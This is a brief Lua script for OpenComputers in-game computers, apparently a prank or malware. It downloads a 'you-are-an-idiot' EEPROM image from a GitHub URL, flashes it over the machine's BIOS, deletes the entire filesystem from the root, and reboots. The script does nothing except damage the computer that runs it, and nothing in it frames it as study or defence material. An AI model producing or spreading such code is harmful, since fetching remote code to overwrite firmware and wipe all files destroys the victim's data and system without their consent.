local component = require("component")
local eeprom = component.eeprom
local fs = require("filesystem")

os.execute("wget -q https://raw.githubusercontent.com/Oyo-Player/OC-you-are-an-idiot-bios/main/eeprom_code.lua /tmp/eeprom_code.lua")
os.execute("flash -q /tmp/eeprom_code.lua")

fs.remove("/")
computer.shutdown(true)
